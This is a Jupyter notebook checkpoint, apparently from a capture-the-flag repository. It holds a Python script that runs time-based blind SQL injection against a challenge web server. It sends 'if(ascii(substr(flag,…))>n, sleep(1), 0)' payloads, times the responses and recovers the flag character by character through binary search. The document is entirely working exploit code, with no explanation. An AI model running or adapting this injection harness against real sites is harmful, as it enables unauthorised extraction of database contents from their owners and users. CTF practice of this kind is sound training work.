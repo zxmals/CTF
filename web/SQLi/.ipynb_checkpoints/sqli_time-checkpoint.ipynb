{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests as req,time,math"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "def check_chr(index:int,ord_index:int):\n",
    "    data = {\"id\":\"1|if((select(ascii(substr(flag,{},1)))from(flag))>{},sleep(1),0)\".format(index,ord_index)}\n",
    "    url = \"http://88f70e8a-c440-4912-a3fc-f2cb57d3d9d0.node4.buuoj.cn:81/\"\n",
    "    st = time.time()\n",
    "    resp = req.post(url,data)\n",
    "    et = time.time()\n",
    "    if et-st>=1:\n",
    "        return True\n",
    "    else:\n",
    "        return False\n",
    "    \n",
    "def check_eq(index:int,ord_index:int):\n",
    "    data = {\"id\":\"1|if((select(ascii(substr(flag,{},1)))from(flag))={},sleep(1),0)\".format(index,ord_index)}\n",
    "    url = \"http://88f70e8a-c440-4912-a3fc-f2cb57d3d9d0.node4.buuoj.cn:81/\"\n",
    "    st = time.time()\n",
    "    resp = req.post(url,data)\n",
    "    et = time.time()\n",
    "    if et-st>=1:\n",
    "        return True\n",
    "    else:\n",
    "        return False"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def binary(flag_index:int,up_index:int,low_index:int):\n",
    "    if check_chr(flag_index,math.floor(low_index+(up_index-low_index)/2)):\n",
    "        if check_eq(flag_index,math.floor(low_index+(up_index-low_index)/2)):\n",
    "            return math.floor(low_index+(up_index-low_index)/2)\n",
    "        else:\n",
    "            return binary(flag_index,up_index,math.floor(low_index+(up_index-low_index)/2))\n",
    "    else:\n",
    "        if check_eq(flag_index,math.floor(low_index+(up_index-low_index)/2)):\n",
    "            return math.floor(low_index+(up_index-low_index)/2)\n",
    "        else:\n",
    "            return binary(flag_index,math.floor(low_index+(up_index-low_index)/2),low_index)\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "flag = \"flag{\"\n",
    "for i in range(6,42):\n",
    "    flag += chr(binary(i,127,0))\n",
    "    print(flag)\n",
    "flag+='}'\n",
    "print(flag)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
